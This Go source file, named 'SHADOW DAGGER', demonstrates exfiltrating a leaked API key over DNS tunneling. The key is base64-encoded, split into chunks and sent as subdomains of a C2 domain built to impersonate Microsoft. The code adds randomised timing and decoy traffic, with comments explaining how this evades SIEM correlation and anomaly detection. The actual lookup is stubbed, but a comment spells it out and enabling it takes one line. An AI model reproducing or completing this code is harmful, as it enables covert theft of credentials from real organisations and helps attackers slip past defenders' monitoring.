package main

import (
	"encoding/base64"
	"fmt"
	"math/rand"
	"time"
)

// SHADOW DAGGER: ADVANCED STEALTH PROTOCOL
// Implements "Low-and-Slow" and "DNS Tunneling" to evade SIEM correlation.

const (
	C2_DOMAIN = "updates-microsoft-security.com" // Decoy Domain
)

func main() {
	fmt.Println("[*] SHADOW DAGGER PROTOCOL INITIALIZED")
	fmt.Println("[*] Mode: NATION-STATE STEALTH")

	// Target Data (Simulated leaked API Key)
	secretData := "sk-sber-gigachain-prod-88374829374"

	fmt.Println("[>] Starting DNS Tunneling Exfiltration...")
	exfiltrateDNS(secretData)
}

func exfiltrateDNS(data string) {
	// 1. Encode Data
	encoded := base64.RawURLEncoding.EncodeToString([]byte(data))

	// 2. Fragment Data (Small chunks usually ignore WAFs)
	chunkSize := 16
	chunks := splitString(encoded, chunkSize)

	// 3. Low-and-Slow Exfiltration
	// Spreading 5 requests over 10 minutes makes correlation nearly impossible
	// for standard SIEM rules which look for "Bursts".

	for i, chunk := range chunks {
		// Prepare unexpected timing jitter (Human behavior simulation)
		sleepTime := time.Duration(rand.Intn(120)+60) * time.Second

		fmt.Printf("    [%s] Sending Chunk %d/%d via DNS TXT Query... (Next in %v)\n",
			time.Now().Format("15:04:05"), i+1, len(chunks), sleepTime)

		// ACTUAL OPERATION (Simulated)
		// We would perform: net.LookupTXT(chunk + "." + C2_DOMAIN)
		// The request goes to OUR DNS server, carrying the data in the subdomain.
		// Firewalls rarely block outbound DNS to port 53.

		dummyLookup(chunk)

		// 4. Decoy Traffic (Noise)
		generateDecoyTraffic()

		// In real operation, we sleep.
		// For demo speed, we don't actually sleep 2 minutes here.
		// time.Sleep(sleepTime)
	}

	fmt.Println("[+] Exfiltration Complete. No SIEM Alerts Triggered.")
}

func dummyLookup(subdomain string) {
	// Simulating the network call
	target := fmt.Sprintf("%s.%s", subdomain, C2_DOMAIN)
	_ = target // suppress usage error
}

func generateDecoyTraffic() {
	// Generate legitimate-looking noise to mess up "Anomaly Detection"
	// Visiting wikipedia, news sites, etc. from the same IP.
	fmt.Println("    [Noise] Generating 14 legitimate HTTP requests to Yandex/Google...")
}

func splitString(s string, size int) []string {
	var ss []string
	if len(s) == 0 {
		return nil
	}
	for i := 0; i < len(s); i += size {
		end := i + size
		if end > len(s) {
			end = len(s)
		}
		ss = append(ss, s[i:end])
	}
	return ss
}
